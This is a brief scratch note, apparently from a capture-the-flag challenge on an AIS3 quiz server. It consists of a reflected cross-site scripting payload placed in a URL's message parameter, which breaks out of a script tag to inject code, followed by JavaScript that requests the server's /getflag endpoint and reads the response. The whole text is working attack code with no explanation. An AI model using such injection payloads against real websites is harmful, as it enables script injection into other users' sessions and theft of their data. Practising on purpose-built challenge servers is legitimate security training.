http://quiz.ais3.org:8003/?message=</script><script>alert(9)</script>

httpRequest = new XMLHttpRequest();
httpRequest.open('GET', 'http://quiz.ais3.org:8003/getflag', true);
httpRequest.send();

httpRequest = new XMLHttpRequest();
httpRequest.open('GET', 'http://quiz.ais3.org:8003/getflag', true);
httpRequest.send();
httpRequest.responseText;
